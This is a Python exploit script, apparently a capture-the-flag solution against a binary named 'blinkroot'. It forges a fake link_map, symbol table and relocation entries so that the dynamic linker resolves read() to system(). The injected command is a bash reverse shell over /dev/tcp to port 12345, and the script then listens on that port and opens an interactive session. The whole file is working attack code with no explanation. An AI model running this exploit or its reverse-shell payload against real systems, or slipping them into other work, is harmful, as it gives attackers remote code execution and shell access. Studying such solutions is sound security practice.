#!/usr/bin/env python
from sc_expwn import *

bin_file = './blinkroot_b872f15bde9878674eb8d46809a6c8564c7c1280'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]})
env.set_item('libc',    debug   = None, \
                        local   = None)
env.select()

#==========

binf = ELF(bin_file)
addr_got_read       = binf.got['read']
addr_gotplt         = binf.sep_section['.got.plt']

addr_data           = binf.symbols['data']

addr_fake_linkmap   = addr_data + 0x10
addr_symtab         = addr_fake_linkmap + 0x100
addr_reloc          = addr_symtab + 0x10
addr_relplt         = addr_reloc  + 0x10
addr_strtab         = addr_fake_linkmap + 0x200

reloc_arg           = 1

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_system  = libc.sep_function['system']
offset_libc_read    = libc.sep_function['read']

offset_read2system  = offset_libc_system - offset_libc_read

#==========

def attack(conn, **kwargs):
    CMD = ";bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1'"

    linkmap  = p(offset_read2system)            # l_addr
    linkmap += CMD
    linkmap += '\x00'*(0x60-len(CMD))
    linkmap += p64(addr_strtab)                 # strtab -> 0x6009e8 + 8 -> .dynstr
    linkmap += p64(addr_symtab)                 # symtab -> 0x6009f8 + 8 -> .dynsym
    linkmap += p64(0) * 16
    linkmap += p64(addr_reloc)                  # reloc  -> 0x600a68 + 8 -> .rela.plt

    symtab  = p64(6)
    symtab += p64(addr_got_read - 8)

    reloc  = p64(0x17)
    reloc += p64(addr_relplt - reloc_arg * 0x18)

    relplt  = p(addr_data + 0x100 - offset_read2system)
    relplt += p32(7)
    relplt += p32(0)
    relplt += p64(0)

    payload  = p(addr_gotplt - addr_data)
    payload += p64(addr_fake_linkmap)
    payload += linkmap + symtab + reloc + relplt
    payload += '\x00'*(1024-len(payload))

    conn.send(payload)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()

    l = listen(12345)
    comn.run(attack)
    l.interactive()

#==========
